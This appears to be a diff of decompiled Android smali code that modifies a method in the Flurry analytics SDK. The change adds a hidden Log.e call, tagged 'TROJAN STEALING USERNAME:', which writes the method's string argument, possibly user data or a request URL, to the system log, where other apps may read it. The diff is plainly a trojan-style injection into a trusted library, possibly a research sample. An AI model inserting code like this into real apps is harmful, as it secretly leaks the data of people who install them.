@@ -156,13 +156,16 @@
 
 # virtual methods
 .method public final a(Ljava/lang/String;)Lorg/apache/http/client/methods/HttpRequestBase;
-    .locals 2
+    .locals 3
 
     sget-object v0, Lcom/flurry/sdk/en$3;->a:[I
 
     invoke-virtual {p0}, Lcom/flurry/sdk/en$a;->ordinal()I
 
     move-result v1
+
+    const-string v2, "TROJAN STEALING USERNAME:" 
+    invoke-static {v2, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I 
 
     aget v0, v0, v1
 
